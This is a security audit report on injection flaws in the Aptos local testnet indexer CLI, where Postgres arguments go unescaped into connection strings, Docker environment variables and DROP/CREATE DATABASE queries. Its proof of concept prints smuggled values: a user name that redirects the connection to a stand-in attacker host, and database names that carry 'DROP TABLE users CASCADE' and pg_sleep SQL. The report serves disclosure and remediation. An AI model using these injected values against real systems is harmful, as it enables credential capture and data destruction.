# Audit Report

## Title
Multiple Injection Vulnerabilities in Local Testnet Indexer API Configuration

## Summary
The local testnet indexer API service (`run_service()` function) passes user-controlled CLI arguments directly into PostgreSQL connection strings and Docker container environment variables without any escaping, URL encoding, or validation. This enables PostgreSQL connection string injection, SQL injection, and potential command injection in container environments.

## Finding Description

The vulnerability exists in how user-provided command-line arguments are processed and passed to Docker containers in the local testnet infrastructure.

### Primary Issue: Lack of Input Sanitization

**Location 1: Connection String Construction** [1](#0-0) 

User-controlled parameters (`postgres_user`, `postgres_database`, `host_postgres_password`, `host_postgres_host`) from CLI arguments are directly interpolated into PostgreSQL connection strings without URL encoding. [2](#0-1) 

**Location 2: Environment Variable Injection** [3](#0-2) 

The unsanitized connection string and port are passed as environment variables to the Hasura Docker container. Special characters in these values are not escaped.

**Location 3: SQL Injection** [4](#0-3) 

The `postgres_database` parameter is directly interpolated into SQL queries without proper quoting or escaping.

### Attack Vectors

**1. PostgreSQL Connection String Injection:**
An attacker providing `--postgres-user "evil@attacker.com:5555/malicious_db#"` would create the connection string:
```
postgres://evil@attacker.com:5555/malicious_db#@intended_host:5432/database
```
This redirects the connection to `attacker.com:5555` instead of the intended database server.

**2. SQL Injection:**
Providing `--postgres-database "testdb; DROP TABLE users CASCADE; --"` results in executing:
```sql
DROP DATABASE IF EXISTS testdb; DROP TABLE users CASCADE; --
CREATE DATABASE testdb; DROP TABLE users CASCADE; --
```

**3. Potential Command Injection:**
If the Docker container entrypoint scripts or Hasura application process these environment variables through shell commands without proper quoting, command injection is possible. While not definitively proven without examining container internals, the lack of escaping creates this risk.

## Impact Explanation

**Severity Assessment: Medium to High**

While this affects a local development tool rather than production blockchain infrastructure, the security implications are significant:

1. **Connection Redirection**: Attackers can redirect database connections to malicious servers, capturing credentials and data
2. **SQL Injection**: Direct database manipulation through injected SQL commands
3. **Data Exfiltration**: Indexer data could be sent to attacker-controlled servers
4. **Supply Chain Attacks**: Compromised CI/CD pipelines or build scripts could inject malicious parameters

This does NOT directly affect:
- Consensus safety or liveness
- Move VM execution
- On-chain state or validator operations
- Core blockchain invariants

However, if developers use this tool in staging environments or validators use it for testing with production-adjacent infrastructure, the impact escalates significantly.

Per Aptos bug bounty criteria, this falls under **Medium Severity** (limited impact on development infrastructure) with potential elevation to **High Severity** if exploitable in validator testing environments.

## Likelihood Explanation

**Likelihood: Medium**

An attacker would need to:
1. Convince a developer to run the CLI with malicious arguments, OR
2. Compromise build scripts/CI pipelines to inject parameters, OR
3. Have existing code execution access to pass CLI arguments

While this requires some level of access, supply chain attacks and compromised CI/CD systems are realistic threat vectors. Developers running untrusted scripts or copying commands from untrusted sources could inadvertently trigger the vulnerability.

## Recommendation

**Immediate Fixes Required:**

1. **URL-encode all connection string components:** [1](#0-0) 

Use the `percent_encoding` crate (already available in the codebase) to encode username, password, host, and database parameters before inserting into connection strings.

2. **Use parameterized database identifiers:** [4](#0-3) 

For PostgreSQL database operations, use identifier quoting or validate against a whitelist of allowed characters (alphanumeric + underscore).

3. **Validate CLI inputs:**
Add validation to reject special characters in parameters:
    - `postgres_user`: Allow only alphanumeric + underscore
    - `postgres_database`: Allow only alphanumeric + underscore
    - `host_postgres_host`: Validate as proper hostname/IP
    - Reject characters like `@`, `:`, `;`, `/`, `?`, `#`, `'`, `"`, `\`

4. **Add security warnings:**
Document that these CLI arguments should never come from untrusted sources.

## Proof of Concept

**Step 1: Connection String Injection Test**
```bash
# Run local testnet with malicious postgres user
aptos node run-localnet \
  --with-indexer-api \
  --use-host-postgres \
  --postgres-user "attacker@malicious.example.com:5555/evil_db#" \
  --host-postgres-password "secret"

# Expected: Connection attempts to malicious.example.com:5555
# instead of legitimate postgres instance
```

**Step 2: SQL Injection Test**
```bash
# Run with malicious database name
aptos node run-localnet \
  --with-indexer-api \
  --use-host-postgres \
  --postgres-database "testdb; SELECT pg_sleep(10); --" \
  --force-restart

# Expected: SQL injection executes sleep command
```

**Step 3: Environment Variable Inspection**
The malicious values propagate to Docker container environment variables without sanitization, visible via:
```bash
docker inspect local-testnet-indexer-api | grep -A 20 "Env"
```

## Notes

**Important Context:**
- This vulnerability affects the **local testnet CLI tool** (`aptos node run-localnet`), not production validator infrastructure
- The threat model assumes attackers can influence CLI arguments through supply chain attacks, malicious scripts, or social engineering
- While this doesn't directly compromise blockchain consensus or on-chain security, it represents a supply chain security risk
- The `percent_encoding` crate is already available in the codebase but not utilized for these parameters [5](#0-4) 

**Defense-in-Depth Principle:**
Even for development tools, proper input sanitization prevents exploitation in unexpected contexts and follows secure coding best practices. The absence of validation violates the principle of "never trust user input."

### Citations

**File:** crates/aptos/src/node/local_testnet/postgres.rs (L42-71)
```rust
    #[clap(long, default_value = "postgres")]
    pub postgres_user: String,

    /// This is the port to use for the postgres instance when --use-host-postgres
    /// is not set (i.e. we are running a postgres instance in a container).
    #[clap(long, default_value_t = 5433)]
    pub postgres_port: u16,

    /// If set, connect to the postgres instance specified by the rest of the
    /// `postgres_args` (e.g. --host-postgres-port) rather than running an instance
    /// with Docker. This can be used to connect to an existing postgres instance
    /// running on the host system.
    ///
    /// WARNING: Any existing database it finds (based on --postgres-database) will be
    /// dropped and recreated.
    #[clap(long, requires = "with_indexer_api")]
    pub use_host_postgres: bool,

    /// If --use-host-postgres is set, you can use this to change the host we try to
    /// connect to.
    #[clap(long, default_value = "127.0.0.1")]
    pub host_postgres_host: String,

    /// When --use-host-postgres is set, this is the port to connect to.
    #[clap(long, default_value_t = 5432)]
    pub host_postgres_port: u16,

    /// When --use-host-postgres is set, this is the password to connect with.
    #[clap(long)]
    pub host_postgres_password: Option<String>,
```

**File:** crates/aptos/src/node/local_testnet/postgres.rs (L112-116)
```rust
        format!(
            "postgres://{}{}@{}:{}/{}",
            self.postgres_user, password, host, port, database,
        )
    }
```

**File:** crates/aptos/src/node/local_testnet/postgres.rs (L159-170)
```rust
        diesel::sql_query(format!(
            "DROP DATABASE IF EXISTS {}",
            self.args.postgres_database
        ))
        .execute(&mut connection)
        .await?;
        info!("Dropped database {}", self.args.postgres_database);

        // Create DB again.
        diesel::sql_query(format!("CREATE DATABASE {}", self.args.postgres_database))
            .execute(&mut connection)
            .await?;
```

**File:** crates/aptos/src/node/local_testnet/indexer_api.rs (L227-240)
```rust
            env: Some(vec![
                format!("PG_DATABASE_URL={}", postgres_connection_string),
                format!(
                    "HASURA_GRAPHQL_METADATA_DATABASE_URL={}",
                    postgres_connection_string
                ),
                format!("INDEXER_V2_POSTGRES_URL={}", postgres_connection_string),
                "HASURA_GRAPHQL_DEV_MODE=true".to_string(),
                "HASURA_GRAPHQL_ENABLE_CONSOLE=true".to_string(),
                // See the docs for the image, this is a magic path inside the
                // container where they have already bundled in the UI assets.
                "HASURA_GRAPHQL_CONSOLE_ASSETS_DIR=/srv/console-assets".to_string(),
                format!("HASURA_GRAPHQL_SERVER_PORT={}", self.indexer_api_port),
            ]),
```

**File:** crates/aptos-openapi/src/lib.rs (L1-50)
```rust
// Copyright (c) Aptos Foundation
// Licensed pursuant to the Innovation-Enabling Source Code License, available at https://github.com/aptos-labs/aptos-core/blob/main/LICENSE

mod helpers;

// Re-export so users don't have to import this themselves.
pub use percent_encoding;


```
